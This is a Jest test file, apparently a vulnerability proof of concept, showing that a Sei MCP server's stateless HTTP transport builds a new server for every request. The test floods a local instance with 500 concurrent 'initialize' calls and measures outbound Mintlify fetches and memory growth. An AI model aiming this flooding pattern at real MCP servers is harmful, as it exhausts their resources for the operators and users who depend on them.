import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import express from 'express';
import http from 'node:http';

// Mock modul package-info untuk mencegah crash __filename di Jest ESM
jest.mock('../../server/package-info.js', () => ({
    getPackageInfo: () => ({
        name: 'sei-mcp-server',
        version: '0.0.0',
        description: 'Sei MCP Server'
    })
}));

import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';
import { getServer } from '../../server/server.js';

// Mock fetch sederhana tanpa casting yang memicu error TS
let mintlifyCallCount = 0;
const originalFetch = global.fetch;

global.fetch = async (url: string | URL | Request): Promise<Response> => {
    const urlString = url.toString();
    if (urlString.includes('leaves.mintlify.com')) {
        mintlifyCallCount++;
        // Simulasi delay jaringan agar efek concurrency dan memory buildup lebih akurat
        await new Promise(resolve => setTimeout(resolve, 50));
        return new Response(JSON.stringify({
            name: 'mock',
            trieveDatasetId: 'mock-id',
            trieveApiKey: 'mock-key'
        }), { status: 200, headers: { 'Content-Type': 'application/json' } });
    }
    // Fallback untuk fetch lain (seperti RPC URL jika ada)
    return new Response('{}', { status: 200 });
};

describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
    let transport: StreamableHttpTransport;
    let app: express.Application;
    let server: http.Server;

    beforeAll(async () => {
        // Inisialisasi transport streamable-http
        transport = new StreamableHttpTransport(0, 'localhost', '/mcp', 'disabled');
        
        // @ts-ignore - Akses properti internal app untuk testing tanpa listen() port asli
        app = transport.app;
        
        // Fallback jika app tidak ter-expose secara internal
        if (!app) {
            app = express();
            app.use(express.json());
            app.post('/mcp', async (req, res) => {
                try {
                    const mcpServer = await getServer();
                    const { StreamableHTTPServerTransport } = await import('@modelcontextprotocol/sdk/server/streamableHttp.js');
                    const httpTransport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
                    res.on('close', () => {
                        httpTransport.close();
                        mcpServer.close();
                    });
                    await mcpServer.connect(httpTransport);
                    await httpTransport.handleRequest(req, res, req.body);
                } catch (error) {
                    if (!res.headersSent) {
                        res.status(500).json({ error: 'Internal Server Error' });
                    }
                }
            });
        }

        server = app.listen(0); // Port 0 = random free port
    });

    afterAll(() => {
        server.close();
        // Restore fetch asli agar tidak mengganggu test lain
        global.fetch = originalFetch;
    });

    it('should trigger external fetch and memory exhaustion on concurrent requests', async () => {
        const port = (server.address() as any).port;
        const targetUrl = `http://localhost:${port}/mcp`;
        
        const payload = {
            jsonrpc: '2.0',
            method: 'initialize',
            params: { protocolVersion: '2024-11-05', capabilities: {} },
            id: 1
        };

        // Catat memory sebelum serangan
        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        const initialMintlifyCalls = mintlifyCallCount;
        console.log(`\n[Before Attack] Memory usage: ${memBefore.toFixed(2)} MB`);

        // Simulasi serangan DoS: 500 request concurrent
        const attackCount = 500;
        console.log(`[Attack] Sending ${attackCount} concurrent requests to trigger getServer()...`);
        
        const requests = [];
        for (let i = 0; i < attackCount; i++) {
            requests.push(
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {}) // Abaikan error (seperti ECONNRESET jika server crash)
            );
        }

        // Tunggu semua request selesai/drop
        await Promise.all(requests);

        // Beri waktu GC sebentar untuk settle
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Catat memory setelah serangan
        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        const totalMintlifyCalls = mintlifyCallCount - initialMintlifyCalls;

        console.log(`[After Attack] Memory usage: ${memAfter.toFixed(2)} MB`);
        console.log(`[Impact] Outbound calls to Mintlify triggered: ${totalMintlifyCalls}`);
        console.log(`[Impact] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        // VERDICT: Jika getServer() dipanggil per request, mintlifyCallCount harusnya sama dengan attackCount
        expect(totalMintlifyCalls).toBe(attackCount);
        
        // Verifikasi bahwa memori membengkak (indikasi object instantiation McpServer)
        expect(memAfter).toBeGreaterThan(memBefore);
    });
});
